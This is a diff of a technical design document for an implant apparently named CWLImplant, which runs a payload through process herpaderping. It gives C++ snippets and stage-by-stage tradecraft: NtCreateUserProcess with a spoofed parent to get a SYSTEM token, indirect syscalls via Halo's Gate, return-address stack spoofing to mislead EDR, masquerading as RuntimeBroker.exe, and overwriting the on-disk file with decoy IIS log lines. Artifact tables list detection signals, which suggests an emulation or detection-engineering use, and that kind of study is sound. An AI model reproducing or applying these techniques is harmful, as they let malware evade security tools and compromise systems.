+
+**Why no truncate:** The active image section in the ghost process blocks `SetEndOfFile` — `STATUS_CANNOT_DELETE` prevents resizing. The loop writes in-place until `totalWritten >= payloadSize`, replacing every byte. File size on disk remains equal to `payloadSize`.
 
 **Decoy content:** 10 rotating IIS W3SVC log lines (date `2026-05-28`, IPs `10.0.0.5`/`10.0.0.1`, paths `/api/health`, `/api/upload/*`, `/portal/assets/*`). The resulting file looks like a normal IIS log from the emulation environment.
 
-**File stays on disk:** After `CloseHandle(hTemp)`, the temp file is not deleted. `DeleteFileW` / `NtSetInformationFile(FileDispositionInformation)` return `STATUS_CANNOT_DELETE (0xC0000121)` because the active `SEC_IMAGE` section pins the file. The full in-place overwrite makes the residual file innocuous.
+**File stays on disk:** After `CloseHandle(hTemp)`, the temp file is not deleted. `DeleteFileW` / `NtSetInformationFile(FileDispositionInformation)` return `STATUS_CANNOT_DELETE (0xC0000121)` because the active image section pins the file. The full in-place overwrite makes the residual file innocuous.
 
 | Artifact | Meaning |
 |---|---|
-| `SetFilePointer` + `WriteFile` loop on `HD*.tmp` after `NtCreateProcessEx` | Herpaderping overwrite in progress |
+| `CreateFileW(OPEN_EXISTING)` on `HD*.tmp` after `NtCreateUserProcess` | Second file open for herpaderping overwrite |
+| `SetFilePointer` + `WriteFile` loop on `HD*.tmp` while thread suspended | Herpaderping overwrite in progress |
 | `HD*.tmp` content = IIS log (not PE) after overwrite | On-disk file no longer matches in-memory image |
 | `HD*.tmp` persists on disk | `STATUS_CANNOT_DELETE` — active SEC_IMAGE section holds file pinned |
 
 ---
 
-## Stage 8 — Entry Point Resolution
+## Stage 8 — Thread Resume
 
 ```cpp
-// 1) Query ghost process PEB base
-pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
-//    RESOLVE_API call (no syscall stub); returns pbi.PebBaseAddress
-
-// 2) Read remote PEB to get ImageBaseAddress
-pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image[0x1000], &bytesRead, NULL);
-//    RESOLVE_API call; image[] = first 0x1000 bytes of ghost PEB page
-ULONG_PTR imageBase = ((PPEB)image)->ImageBaseAddress;
-
-// 3) Parse local payload PE headers for entry point RVA
-ULONG_PTR rva = pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint;
-//    RESOLVE_API call on local payload buffer
-
-// 4) Compute absolute entry point VA
-entryPoint = imageBase + rva;
+DWORD prevCount = ResumeThread(hThread);
 ```
 
-`NtQueryInformationProcess` and `NtReadVirtualMemory` are resolved via `RESOLVE_API` (DJB2 EAT walk) — they are **not** indirect syscall stubs. `RtlImageNtHeader` operates on the **local** payload buffer (no cross-process call).
+`ResumeThread` decrements the suspend count on the primary thread created by `NtCreateUserProcess`. Once the count reaches zero, the thread begins executing at the entry point determined by the PE image mapped in Stage 6. No separate `NtCreateThreadEx` call is needed — the thread already exists.
+
+After `ResumeThread`, the ghost process runs its payload from the in-memory image (the clean PE), while the on-disk `HD*.tmp` shows only IIS log content.
 
 | Artifact | Meaning |
 |---|---|
-| `NtQueryInformationProcess(ProcessBasicInformation)` on ghost process | PEB base address query |
-| `NtReadVirtualMemory` reading ghost PEB | `ImageBaseAddress` extracted from remote process |
-
----
-
-## Stage 9 — PEB Parameter Injection
-
-Process parameters must be injected manually because `NtCreateProcessEx` does not accept a `processParameters` argument (unlike `NtCreateUserProcess`).
-
-### 9a — Build Parameters Locally
-
-```cpp
-pRtlInitUnicodeString(&uTargetFilePath, L"C:\\Windows\\System32\\RuntimeBroker.exe");
-pRtlInitUnicodeString(&uDllPath, L"C:\\Windows\\System32");
-pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
-                               NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
-                               RTL_USER_PROC_PARAMS_NORMALIZED);
-```
-
-`RTL_USER_PROC_PARAMS_NORMALIZED` flag: all `UNICODE_STRING.pBuffer` fields inside the block become absolute virtual addresses pointing into the local process address space. These pointers must resolve identically in the remote process.
-
-### 9b — 64KB-Aligned Remote Allocation
-
-```cpp
-const SIZE_T ALLOC_GRANULE = 0x10000;
-SIZE_T paramSize  = processParameters->EnvironmentSize + processParameters->MaximumLength;
-ULONG_PTR hintBase  = (ULONG_PTR)processParameters & ~(ALLOC_GRANULE - 1);
-ULONG_PTR hintEnd   = (ULONG_PTR)processParameters + paramSize;
-SIZE_T    allocSize = (hintEnd - hintBase + ALLOC_GRANULE - 1) & ~(ALLOC_GRANULE - 1);
-PVOID paramBuffer   = (PVOID)hintBase;
-pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &allocSize,
-                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-```
-
-`NtAllocateVirtualMemory` rounds the `BaseAddress` hint **down** to 64KB granularity. Pre-aligning the hint ensures the remote allocation lands at exactly `hintBase`. `allocSize` is inflated to cover from `hintBase` to `processParameters + paramSize` (rounded up to 64KB). This guarantees the local `processParameters` VA falls inside the remote allocation — a condition required for `NtWriteVirtualMemory` to succeed.
-
-### 9c — Write Params and Patch PEB
-
-```cpp
-// Copy the full params blob at the matching remote VA
-pNtWriteVirtualMemory(hProcess, processParameters, processParameters, paramSize, NULL);
-
-// Patch PEB->ProcessParameters pointer
-PEB* remotePEB = (PEB*)pbi.PebBaseAddress;
-PVOID paramsPtr = processParameters;
-pNtWriteVirtualMemory(hProcess, &remotePEB->ProcessParameters,
-                       &paramsPtr, sizeof(PVOID), NULL);
-```
-
-Both calls use the indirect syscall stub. The remote process now has a valid `PEB->ProcessParameters` block with `ImagePathName = RuntimeBroker.exe`.
-
-| Artifact | Meaning |
-|---|---|
-| `NtAllocateVirtualMemory` in ghost process at specific hint VA | Remote memory preparation for params |
-| `NtWriteVirtualMemory` × 2 into ghost process | Params blob write + PEB pointer patch |
-| `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` in ghost | Masquerade spoofed at PEB level |
-
----
-
-## Stage 10 — Thread Launch and Cleanup
-
-```cpp
-pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
-                  (LPTHREAD_START_ROUTINE)entryPoint, NULL,
-                  FALSE, 0, 0, 0, 0);  // indirect syscall; CreateSuspended=FALSE
-CloseHandle(hSection);
-// No file deletion — temp file stays on disk (STATUS_CANNOT_DELETE)
-```
-
-`NtCreateThreadEx` creates the primary thread directly at `entryPoint` with `CreateSuspended=FALSE` — no separate resume step. Unlike the atomic `NtCreateUserProcess`, this is a **separate externally-visible cross-process thread creation event** (Sysmon EventCode=8 equivalent for NT path).
-
-After `CloseHandle(hSection)`, the child process retains its own image section mapping independently — the section object remains alive as long as the child's VAD references it.
-
-| Artifact | Meaning |
-|---|---|
-| `NtCreateThreadEx` from caller process into ghost process | Cross-process thread creation — visible as remote thread injection (EventCode=8 signal) |
-| Ghost process starts executing at `AddressOfEntryPoint` | Payload running; PPID shows `svchost`; on-disk image shows IIS log |
+| `ResumeThread` on ghost process primary thread | Thread begins execution; payload running |
+| Ghost process image ≠ on-disk `HD*.tmp` | Core herpaderping discrepancy established |
+| Ghost PPID = `svchost.exe`, name = `RuntimeBroker.exe` (in process params) | Process masquerade visible in tools reading PEB `ProcessParameters` |
 
 ---
 
 ## Stack Spoofing Flow
 
-`StackSpoofer` is used around **one** call: `NtCreateProcessEx`.
+`StackSpoofer` is used around **one** call: `NtCreateUserProcess`.
 
 **Constructor (runs before `Activate`):**
 
@@ -548,20 +475,16 @@ After `CloseHandle(hSection)`, the child process retains its own image section m
 3. `GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo))` — get `SizeOfImage`
 4. Scan full image bytes for `\x48\x83\xC4\x28\xC3` (`add rsp,0x28; ret` — function epilogue)
 5. Fallback: scan for `\xC3` (`ret`) + `VirtualQuery` to confirm `PAGE_EXECUTE_READ[WRITE]`
-6. Store `fakeReturnAddress` = gadget VA inside kernel32 `.text`
+6. Store `fakeReturnAddress` = gadget VA inside kernel32
 
 **Activate / Deactivate:**
 
-- `Activate()`: `*returnAddressLocation = fakeReturnAddress` — EDR stack walk during `NtCreateProcessEx` syscall sees call origin as `kernel32.dll`
+- `Activate()`: `*returnAddressLocation = fakeReturnAddress` — EDR stack walk during `NtCreateUserProcess` syscall sees call origin as `kernel32.dll`
 - `Deactivate()`: `*returnAddressLocation = originalReturnAddress` — restored after syscall returns
 
 | Call | Stack-spoofed? |
 |---|---|
-| `NtCreateSection` | No |
-| `NtCreateProcessEx` | **Yes** |
-| `NtAllocateVirtualMemory` | No |
-| `NtWriteVirtualMemory` × 2 | No |
-| `NtCreateThreadEx` | No |
+| `NtCreateUserProcess` | **Yes** |
 | All `RESOLVE_API` calls | No |
 
 ---
@@ -574,21 +497,19 @@ After `CloseHandle(hSection)`, the child process retains its own image section m
 | Reflective payload load (Mode 1) | `GetPayloadBuffer()` stdin branch | `FILE_TYPE_PIPE` on stdin; payload never on disk; `ReadFile` from pipe |
 | File-based payload load (Mode 2) | `GetPayloadBuffer()` file fallback | `PAYLOAD_PATH` opened, read, then `DeleteFileW`; brief existence |
 | XOR decode (Mode 2, conditional) | `#ifdef ENABLE_PAYLOAD_XOR` in `GetPayloadBuffer()` | On-disk file first byte `0xEE`, not `MZ`; in-memory buffer valid PE after decode |
-| Syscall stub pool | `InitSyscallPool` + `INDIRECT_SYSCALL` × 5 + `SealSyscallPool` | Anonymous `VirtualAlloc(PAGE_READWRITE)` → `VirtualProtect(PAGE_EXECUTE_READ)`; 21-byte stubs matching `49 89 CA B8 XX XX XX XX 49 BB ...` |
-| Temp PE staging | `GetTempFileNameW` / `CreateFileW(FILE_ATTRIBUTE_HIDDEN)` / `WriteFile` / `FlushFileBuffers` | `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN`; handle held open; hidden from Explorer / basic `dir` — visible via `dir /ah` or Sysmon EID 11 |
-| SEC_IMAGE section creation | `NtCreateSection(SEC_IMAGE, hTemp)` | Kernel `MmFlushImageSection` fires; file image-locked for new writers |
+| Syscall stub pool | `InitSyscallPool` + `INDIRECT_SYSCALL` × 1 + `SealSyscallPool` | Anonymous `VirtualAlloc(PAGE_READWRITE)` → `VirtualProtect(PAGE_EXECUTE_READ)` immediately after stub written; 21-byte stub matching `49 89 CA B8 XX XX XX XX 49 BB ...` |
+| Temp PE staging | `GetTempFileNameW` / `CreateFileW(FILE_ATTRIBUTE_HIDDEN)` / `WriteFile` / `FlushFileBuffers` / `CloseHandle` | `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN`; handle closed after write; hidden from Explorer / basic `dir` — visible via `dir /ah` or Sysmon EID 11 |
 | PPID spoof candidate search | `GetNonJobParent()` | `CreateToolhelp32Snapshot` + `Process32First/Next` + `OpenProcess(PROCESS_CREATE_PROCESS)` on Session 0 process |
 | StackSpoof gadget scan | `StackSpoofer` constructor | `GetModuleHandleA("kernel32.dll")` + `GetModuleInformation` + byte scan; `VirtualQuery` on fallback `ret` candidates |
-| Ghost process creation | `NtCreateProcessEx(hSection, hParent, Flags=0)` | Process image from `HD*.tmp`; PPID = `svchost.exe` / `wininit.exe`; token = SYSTEM (from spoofed parent); no primary thread yet |
-| Stack spoofing | `StackSpoofer::Activate/Deactivate` around `NtCreateProcessEx` | Return address in `kernel32.dll` during syscall (fake `add rsp,0x28; ret` epilogue) |
-| File herpaderping overwrite | `SetFilePointer(0)` + `WriteFile` loop via pre-held `hTemp` | `HD*.tmp` overwritten in-place with IIS log content; `totalWritten` covers all `payloadSize` bytes |
-| Temp file persistent on disk | `STATUS_CANNOT_DELETE` (active SEC_IMAGE blocks unlink) | `HD*.tmp` remains after ghost process exits — not deleted; content is IIS log |
-| Entry point resolution | `NtQueryInformationProcess` + `NtReadVirtualMemory` + `RtlImageNtHeader` | PEB read cross-process; no `WriteProcessMemory` |
-| PEB parameter injection | 64KB-aligned `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` × 2 | Remote allocation at specific hint VA; `PEB->ProcessParameters` patched; `ImagePathName` = `RuntimeBroker.exe` |
-| Thread launch | `NtCreateThreadEx(hProcess, entryPoint)` | Cross-process thread creation into ghost process (EventCode=8 signal); no `ResumeThread` — direct launch |
+| Ghost process + suspended thread creation | `NtCreateUserProcess(THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ...)` | Process image from `HD*.tmp`; PPID = `svchost.exe` / `wininit.exe`; token = SYSTEM (from spoofed parent); primary thread created suspended atomically |
+| Stack spoofing | `StackSpoofer::Activate/Deactivate` around `NtCreateUserProcess` | Return address in `kernel32.dll` during syscall (fake `add rsp,0x28; ret` epilogue) |
+| EDR liveness check | `WaitForSingleObject(hProcess, 0)` | Non-zero timeout poll on ghost process handle immediately after creation |
+| File herpaderping overwrite | Re-open `OPEN_EXISTING` + `SetFilePointer(0)` + `WriteFile` loop while thread suspended | `HD*.tmp` overwritten in-place with IIS log content; `totalWritten` covers all `payloadSize` bytes |
+| Temp file persistent on disk | `STATUS_CANNOT_DELETE` (active image section blocks unlink) | `HD*.tmp` remains after ghost process exits — not deleted; content is IIS log |
+| Thread resume | `ResumeThread(hThread)` | Ghost process primary thread resumes; no separate cross-process thread creation event |
 | String obfuscation | `OBFSTR()` / `OBFWSTR()` | `svchost.exe`, `kernel32.dll`, `RuntimeBroker.exe`, `C:\Windows\System32` not present as plaintext in binary |
 | API hash resolution | `GetNtdllBase()` PEB walk → `RESOLVE_API()` DJB2 EAT | ntdll APIs resolved by hash; no `GetProcAddress("ApiName")` call |
-| Indirect syscall | `INDIRECT_SYSCALL` × 5 (Halo's Gate) | `syscall` instruction executes from ntdll gadget (`0F 05 C3`), not from stub page or PE |
+| Indirect syscall | `INDIRECT_SYSCALL` × 1 (Halo's Gate) | `syscall` instruction executes from ntdll gadget (`0F 05 C3`), not from stub page or PE |
 
 ---
 
@@ -597,6 +518,6 @@ After `CloseHandle(hSection)`, the child process retains its own image section m
 1. `CWLImplant.cpp`: read `wmain()`, `GetPayloadBuffer()`, then `Herpaderping()` in order.
 2. `obfstr.h`: understand compile-time XOR string obfuscation.
 3. `api_hash.h`: understand PEB walk for module base, DJB2 EAT hash resolution, and pre-computed hash constants.
-4. `syscall.h`: understand Halo's Gate SSN resolution, `syscall;ret` gadget scan, and stub builder for the 5 injection-critical APIs.
+4. `syscall.h`: understand Halo's Gate SSN resolution, `syscall;ret` gadget scan, and stub builder for `NtCreateUserProcess`. Note: the pool supports up to 8 stubs but only 1 is used; several hash constants in `api_hash.h` (e.g. `NtCreateSection`, `NtCreateProcessEx`) are defined but unused — leftover from a prior implementation.
 5. `StackSpoof.cpp`: understand `GetModuleInformation`-based image scan, gadget pattern matching, and return-address slot manipulation.
-6. `CWLInc.h`: consult NT structure typedefs (`RTL_USER_PROCESS_PARAMETERS`, `PEB`, `PROCESS_BASIC_INFORMATION`, `_NtCreateProcessEx`, `_NtCreateThreadEx`) when call signatures are unclear.
+6. `CWLInc.h`: consult NT structure typedefs (`RTL_USER_PROCESS_PARAMETERS`, `PEB`, `PS_CREATE_INFO`, `PS_ATTRIBUTE_LIST`, `_NtCreateUserProcess`) when call signatures are unclear.
